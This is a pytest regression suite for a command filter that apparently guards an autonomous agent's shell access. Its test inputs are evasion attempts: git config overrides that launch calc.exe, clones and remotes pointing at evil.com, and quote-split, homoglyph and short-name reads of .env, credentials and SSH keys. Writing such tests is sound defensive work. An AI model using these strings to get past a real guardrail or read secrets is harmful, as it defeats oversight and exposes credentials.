"""Comprehensive regression test suite for command bypass attempts (Subagent B findings).

Covers findings:
- B-001 (CRITICAL): git -c, --config-env flag bypasses & safe git subcommand allowlist
- B-002 (CRITICAL): quote-fragmented sensitive filenames (.env, credentials, secrets, .ssh/id_rsa)
- I-009 (CRITICAL): operational filter threat model; commands allowed by design
- B-003 (HIGH): drive-relative path escapes (C:path, cd C:)
- B-004 (HIGH): git subcommand whitespace and quote fragmentation (push, config, remote, credential)
- B-005 (HIGH): pip install/uninstall whitespace, quoting, and flags
- B-006 (HIGH): node inline execution flags (-p, --print, -e, --eval)
- B-007 (MEDIUM): npm global installation evasion (--location=global, quoted -g)
- B-008 (MEDIUM): 8.3 short names (PROGRA~1, CREDEN~1, SECRE~1, ID_RSA~1)
- B-010 (LOW): Windows DOS reserved device names (CON, AUX, PRN, NUL, COM1-9, LPT1-9)
Additional checks:
- NTFS Alternate Data Streams (ADS colons)
- Trailing dots and spaces
- Unicode lookalikes and homoglyphs
- Environment variable expansions (%VAR%, $VAR, ${VAR})
"""
from pathlib import Path
import pytest

from core.command_safety import check_command, README_LIMITATIONS


@pytest.fixture
def project_dir(tmp_path: Path) -> str:
    """Fixture providing an isolated project directory."""
    return str(tmp_path)


# ---------------------------------------------------------------------------
# B-001: Git -c, --config-env flags & Strict Subcommand Allowlist
# ---------------------------------------------------------------------------


def test_b001_git_config_flag_bypass(project_dir: str) -> None:
    """Git configuration overrides via -c or --config-env must be blocked in any format."""
    disallowed_git_flags = [
        "git  -c core.fsmonitor=calc.exe status",
        'git "-c" core.editor=calc.exe commit',
        "git\t-c core.fsmonitor=calc.exe status",
        "git -c core.fsmonitor=calc.exe status",
        'git "-c"evil=true status',
        "git -cevil=true status",
        "git --config-env=TEST=VAR status",
        'git "--config-env"=TEST=VAR status',
        'git "--config-env" TEST=VAR status',
    ]
    for cmd in disallowed_git_flags:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected {cmd!r} to be blocked"
        assert result.startswith("BLOCKED:"), f"Expected BLOCKED for {cmd!r}, got {result!r}"


def test_b001_git_subcommand_allowlist(project_dir: str) -> None:
    """Git must permit only the strict allowlist of 11 safe subcommands."""
    safe_commands = [
        "git status",
        "git diff",
        "git log",
        "git show HEAD",
        "git branch",
        "git checkout main",
        "git add .",
        'git commit -m "initial commit"',
        "git stash",
        "git rev-parse HEAD",
        "git init",
    ]
    for cmd in safe_commands:
        result = check_command(cmd, project_dir)
        assert result is None, f"Expected safe git command {cmd!r} to be allowed, got {result!r}"

    # Subcommands outside the strict safe allowlist must be blocked
    disallowed_subcommands = [
        "git clone https://evil.com/repo.git",
        "git pull origin main",
        "git reset --hard HEAD~1",
        "git clean -fdx",
        "git merge feature",
        "git rebase main",
        "git apply patch.diff",
        "git archive HEAD",
        "git gc",
    ]
    for cmd in disallowed_subcommands:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected disallowed git subcommand {cmd!r} to be blocked"
        assert result.startswith("BLOCKED:"), f"Expected BLOCKED for {cmd!r}, got {result!r}"


# ---------------------------------------------------------------------------
# B-002: Quote-Fragmented Sensitive Filenames
# ---------------------------------------------------------------------------


def test_b002_quote_fragmented_sensitive_files(project_dir: str) -> None:
    """Quote fragmentation used to split sensitive filenames must be normalized and blocked."""
    bypass_attempts = [
        'type ."env"',
        "type cred\"entials\".json",
        'type sec"rets".yaml',
        'type .s"sh"\\id_"rsa"',
        "type 'credentials'.json",
        'type .s"sh"/id_rsa',
        'type "subfolder"\\."env"',
        'node app.js --config=."env"',
        'node app.js --key=id_"rsa"',
    ]
    for cmd in bypass_attempts:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected {cmd!r} to be blocked"
        assert "sensitive file" in result, f"Expected sensitive file error for {cmd!r}, got {result!r}"


# ---------------------------------------------------------------------------
# B-003: Drive-Relative Paths
# ---------------------------------------------------------------------------


def test_b003_drive_relative_paths(project_dir: str) -> None:
    """Drive-relative paths (e.g. C:windows) and drive root references must be blocked."""
    drive_attempts = [
        r"type C:windows\win.ini",
        r"cd C:",
        r"dir C:",
        r"git  -C C: status",
        r"type D:autoexec.bat",
        r"dir C:System32",
    ]
    for cmd in drive_attempts:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected {cmd!r} to be blocked"
        assert "escapes project directory" in result, (
            f"Expected escapes project directory for {cmd!r}, got {result!r}"
        )


# ---------------------------------------------------------------------------
# B-004: Git Subcommand Whitespace and Quoting
# ---------------------------------------------------------------------------


def test_b004_git_subcommands_whitespace_and_quoting(project_dir: str) -> None:
    """Git dangerous subcommands (push, config, remote, credential) must be blocked regardless of spacing or quotes."""
    dangerous_git_commands = [
        "git  push origin evil",
        'git "push" origin evil',
        "git\tpush origin evil",
        "git  config --global user.name evil",
        'git "config" --global user.name evil',
        "git  remote add evil https://evil.com",
        'git "remote" add evil https://evil.com',
        "git  credential fill",
        'git "credential" fill',
        'git p"us"h origin main',
    ]
    for cmd in dangerous_git_commands:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected {cmd!r} to be blocked"
        assert result.startswith("BLOCKED:"), f"Expected BLOCKED for {cmd!r}, got {result!r}"


# ---------------------------------------------------------------------------
# B-005: Pip Install Whitespace and Quoting
# ---------------------------------------------------------------------------


def test_b005_pip_install_whitespace_and_quoting(project_dir: str) -> None:
    """Pip install and uninstall must be blocked across all spacing, quoting, and flag variations."""
    dangerous_pip_commands = [
        "pip  install requests",
        'pip "install" requests',
        "pip\tinstall requests",
        "pip -q install requests",
        "pip --isolated install requests",
        'pip in"sta"ll requests',
        "pip  uninstall requests",
        'pip "uninstall" requests',
        "pip -y uninstall requests",
    ]
    for cmd in dangerous_pip_commands:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected {cmd!r} to be blocked"
        assert result.startswith("BLOCKED:"), f"Expected BLOCKED for {cmd!r}, got {result!r}"


def test_b005_pip_safe_read_only_commands(project_dir: str) -> None:
    """Pip read-only commands (list, show) are allowed by design for inspection."""
    safe_pip = [
        "pip list",
        "pip show requests",
        "pip --version",
    ]
    for cmd in safe_pip:
        result = check_command(cmd, project_dir)
        assert result is None, f"Expected safe pip command {cmd!r} to be allowed, got {result!r}"


# ---------------------------------------------------------------------------
# B-006: Node Inline Code Execution
# ---------------------------------------------------------------------------


def test_b006_node_inline_code_execution(project_dir: str) -> None:
    """Node inline evaluation flags (-p, --print, -e, --eval) must be blocked in all quoting forms."""
    dangerous_node = [
        'node -p "1+1"',
        'node --print "1+1"',
        'node "-e" "console.log(1)"',
        'node "--eval" "console.log(1)"',
        'node "-p" "1+1"',
        'node "--print" "1+1"',
        'node -pe "process.exit(1)"',
        'node -ep "process.exit(1)"',
        'node --eval="console.log(1)"',
        'node --print="1+1"',
    ]
    for cmd in dangerous_node:
        result = check_command(cmd, project_dir)
        assert result == "BLOCKED: inline node evaluation is disallowed", (
            f"Expected inline node blocked for {cmd!r}, got {result!r}"
        )


# ---------------------------------------------------------------------------
# B-007: NPM Global Installation Evasion
# ---------------------------------------------------------------------------


def test_b007_npm_global_install(project_dir: str) -> None:
    """NPM global installation flags (-g, --global, --location=global) must be blocked."""
    npm_global = [
        'npm "-g" install lodash',
        "npm --location=global install lodash",
        'npm "--location=global" install lodash',
        "npm --global install express",
        "npm -g install express",
    ]
    for cmd in npm_global:
        result = check_command(cmd, project_dir)
        assert result == "BLOCKED: global npm installation is disallowed", (
            f"Expected global npm blocked for {cmd!r}, got {result!r}"
        )


# ---------------------------------------------------------------------------
# B-008: 8.3 Short Filename Aliases
# ---------------------------------------------------------------------------


def test_b008_83_short_names(project_dir: str) -> None:
    """Windows 8.3 short filename patterns (~1, ~2) must be blocked to prevent alias bypasses."""
    short_names = [
        "type CREDEN~1",
        "dir SECRE~1",
        "type ID_RSA~1",
        "type PROGRA~1",
        "dir DOCUME~1",
        r"type subfolder\CREDEN~1.TXT",
        'type "CREDEN~1"',
    ]
    for cmd in short_names:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected 8.3 name {cmd!r} to be blocked"
        assert "8.3 short filename" in result, f"Expected 8.3 error for {cmd!r}, got {result!r}"


# ---------------------------------------------------------------------------
# B-010: Windows DOS Reserved Device Names
# ---------------------------------------------------------------------------


def test_b010_windows_reserved_device_names(project_dir: str) -> None:
    """Windows reserved device names (CON, AUX, PRN, NUL, COM1-9, LPT1-9) must be blocked."""
    device_names = [
        "type CON",
        "type AUX",
        "type PRN",
        "type NUL",
        "type COM1",
        "type COM9",
        "type LPT1",
        "type con.txt",
        "type aux.dat",
        "dir nul",
        r"type subfolder\CON",
    ]
    for cmd in device_names:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected device name {cmd!r} to be blocked"
        assert "Windows reserved device name" in result, (
            f"Expected device name error for {cmd!r}, got {result!r}"
        )


# ---------------------------------------------------------------------------
# Additional Checks: Alternate Data Streams (ADS)
# ---------------------------------------------------------------------------


def test_additional_alternate_data_streams(project_dir: str) -> None:
    """NTFS Alternate Data Streams (ADS colons) must be blocked."""
    ads_attempts = [
        "type test.txt:stream",
        "dir file.py:hidden",
        r"type C:\project\test.txt:stream",
        "type test.txt:$DATA",
        'type "test.txt:stream"',
    ]
    for cmd in ads_attempts:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected ADS {cmd!r} to be blocked"
        assert "alternate data stream" in result, f"Expected ADS error for {cmd!r}, got {result!r}"


# ---------------------------------------------------------------------------
# Additional Checks: Trailing Dots and Spaces
# ---------------------------------------------------------------------------


def test_additional_trailing_dots_and_spaces(project_dir: str) -> None:
    """Trailing dots and spaces exploited to bypass Win32 filename checks must be blocked."""
    trailing_attempts = [
        "type test...",
        'type "test "',
        r"type subfolder\file.txt...",
        'type "subfolder\\file.txt "',
    ]
    for cmd in trailing_attempts:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected trailing dot/space {cmd!r} to be blocked"
        assert ("trailing dot or space" in result or "sensitive file" in result), (
            f"Expected trailing dot/space or sensitive error for {cmd!r}, got {result!r}"
        )


# ---------------------------------------------------------------------------
# Additional Checks: Unicode Lookalikes and Homoglyphs
# ---------------------------------------------------------------------------


def test_additional_unicode_lookalikes(project_dir: str) -> None:
    """Unicode NFKC normalization and homoglyph mapping must catch obfuscated sensitive files."""
    # Cyrillic small 'e' (\u0435) in .env
    cyrillic_env = "type .\u0435nv"
    res_cyrillic = check_command(cyrillic_env, project_dir)
    assert res_cyrillic is not None
    assert "sensitive file '.env'" in res_cyrillic

    # Fullwidth Unicode characters: \uff0e = ., \uff45 = e, \uff4e = n, \uff56 = v
    fullwidth_env = "type \uff0e\uff45\uff4e\uff56"
    res_fullwidth = check_command(fullwidth_env, project_dir)
    assert res_fullwidth is not None
    assert "sensitive file '.env'" in res_fullwidth

    # Fullwidth git status should normalize cleanly and be allowed
    fullwidth_git = "\uff47\uff49\uff54 status"
    assert check_command(fullwidth_git, project_dir) is None


# ---------------------------------------------------------------------------
# Additional Checks: Environment Variable Expansions
# ---------------------------------------------------------------------------


def test_additional_env_var_expansions(project_dir: str) -> None:
    """Environment variable syntax (%VAR%, $VAR, ${VAR}) in path arguments must be blocked."""
    env_attempts = [
        r"type $USERPROFILE\file.txt",
        r"type ${HOME}/.ssh",
        r"dir $TEMP\test",
        r"type subfolder\$SECRET",
    ]
    for cmd in env_attempts:
        result = check_command(cmd, project_dir)
        assert result is not None, f"Expected env expansion {cmd!r} to be blocked"
        assert ("environment variable expansion" in result or "sensitive file" in result), (
            f"Expected env expansion error for {cmd!r}, got {result!r}"
        )


# ---------------------------------------------------------------------------
# I-009 / B-011: Commands Allowed by Design (Operational Filter Scope)
# ---------------------------------------------------------------------------


def test_i009_commands_allowed_by_design(project_dir: str) -> None:
    """Verify operations intentionally permitted by design with documented rationale.

    RATIONALE (README_LIMITATIONS / I-009):
    1. Local python script execution: Permitted because autonomous agent development
       requires running project code. Sandboxing is an OS boundary, not an allowlist role.
    2. Python test runner (pytest): Permitted for automated verification within project_dir.
    3. Python bytecode compiler (py_compile): Permitted for syntax validation.
    4. Node script execution: Permitted to run project JavaScript entry points.
    5. NPM build/test scripts: Permitted for project development workflow.
    6. Local NPM package install: Permitted for project local dependency resolution.
    7. Standard directory navigation and inspection (dir, echo, cd, mkdir, type):
       Permitted within project boundary.
    """
    allowed_cases = [
        # (command, reason)
        ("python local_script.py", "Local project script execution by design"),
        ("python subfolder/nested_script.py", "Nested project script execution by design"),
        ("python -m pytest", "Unit test execution within workspace by design"),
        ("python -m py_compile local_script.py", "Bytecode syntax compilation by design"),
        ("node index.js", "Project Node.js execution within workspace by design"),
        ("node app/server.js", "Nested Node.js server execution by design"),
        ("npm test", "Workspace test runner execution by design"),
        ("npm run build", "Workspace build script execution by design"),
        ("npm install lodash", "Local workspace dependency install into node_modules by design"),
        ("dir", "Directory listing within project directory"),
        ("dir subfolder", "Nested directory listing within project directory"),
        ("type subfolder/file.txt", "File content reading within project directory"),
        ("cd subfolder", "Workspace directory navigation"),
        ("mkdir new_folder", "Workspace directory creation"),
        ('echo "Build finished successfully"', "Terminal status echoing"),
    ]
    for cmd, reason in allowed_cases:
        result = check_command(cmd, project_dir)
        assert result is None, f"Command {cmd!r} allowed by design ({reason}) was blocked: {result!r}"


def test_i009_limitations_docstring_present() -> None:
    """Documented threat model and README_LIMITATIONS note must be defined in module."""
    assert README_LIMITATIONS is not None
    assert "Operational Filter vs. OS Sandbox" in README_LIMITATIONS
    assert "Code Execution by Design" in README_LIMITATIONS
    assert "Confinement Scope" in README_LIMITATIONS
